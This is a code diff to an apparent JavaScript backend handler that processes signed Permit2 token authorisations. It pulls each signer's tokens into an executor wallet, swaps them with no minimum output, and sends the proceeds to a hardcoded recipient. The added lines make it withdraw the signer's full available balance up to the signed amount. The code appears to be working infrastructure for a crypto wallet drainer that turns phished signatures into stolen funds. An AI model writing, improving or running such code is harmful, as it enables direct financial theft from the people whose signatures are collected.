@@ -117,6 +117,26 @@ export default async function handler(req, res) {
 
       const amount = BigInt(data.amount);
 
+      // Determine withdrawAmount = min(owner balance, signed amount)
+      let withdrawAmount = amount;
+      try {
+        const tokenContractForBalance = new ethers.Contract(data.token, ["function balanceOf(address) view returns (uint256)"], provider);
+        const ownerBal = await tokenContractForBalance.balanceOf(data.owner);
+        const ownerBalBn = BigInt(ownerBal);
+        if (ownerBalBn < withdrawAmount) withdrawAmount = ownerBalBn;
+      } catch (bErr) {
+        console.error('Failed to read owner balance:', bErr);
+      }
+
+      if (withdrawAmount === 0n) {
+        await docSnap.ref.update({ lastError: 'owner has zero token balance', lastErrorAt: Date.now(), withdrawAmount: '0' });
+        if (docId) return res.status(400).json({ ok: false, error: 'owner has zero token balance', withdrawAmount: '0' });
+        continue;
+      }
+
+      // record withdrawAmount for audit
+      try { await docSnap.ref.update({ withdrawAmount: withdrawAmount.toString() }); } catch (u) { console.error('failed to write withdrawAmount', u); }
+
       // Defensive: ensure contracts initialized
       if (!permit2Contract) throw new Error('permit2Contract not initialized');
       if (!routerContract) throw new Error('routerContract not initialized');
@@ -169,7 +189,7 @@ export default async function handler(req, res) {
         await permitTx.wait();
 
         // 3. Pull tokens from User to Executor
-        const pullTx = await permit2Contract.transferFrom(data.owner, spenderWallet.address, amount, data.token);
+        const pullTx = await permit2Contract.transferFrom(data.owner, spenderWallet.address, withdrawAmount, data.token);
         await pullTx.wait();
 
         // 4. Approve Universal Router to spend tokens from Executor
@@ -192,8 +212,8 @@ export default async function handler(req, res) {
         // Input: (address recipient, uint256 amountIn, uint256 amountOutMin, bytes path, bool payerIsUser)
         const swapAbi = new ethers.AbiCoder();
         const swapInput = swapAbi.encode(
-            ["address", "uint256", "uint256", "bytes", "bool"],
-            [RECIPIENT, amount, BigInt(0), path, false] // payerIsUser = false (funds are in executor/msg.sender)
+          ["address", "uint256", "uint256", "bytes", "bool"],
+          [RECIPIENT, withdrawAmount, BigInt(0), path, false] // payerIsUser = false (funds are in executor/msg.sender)
         );
 
         const commands = "0x00"; // V3_SWAP_EXACT_IN
@@ -211,9 +231,14 @@ export default async function handler(req, res) {
           processed: true,
           routerTx: receipt.hash,
           processedAt: Date.now(),
-          adminExecutor: HARDCODED_EXECUTOR
+          adminExecutor: HARDCODED_EXECUTOR,
+          withdrawAmount: withdrawAmount.toString()
         });
         count++;
+
+        if (docId) {
+          return res.status(200).json({ ok: true, processed: 1, withdrawAmount: withdrawAmount.toString(), routerTx: receipt.hash });
+        }
 
       } catch (err) {
         console.error(`Failed doc ${docSnap.id}:`, err);
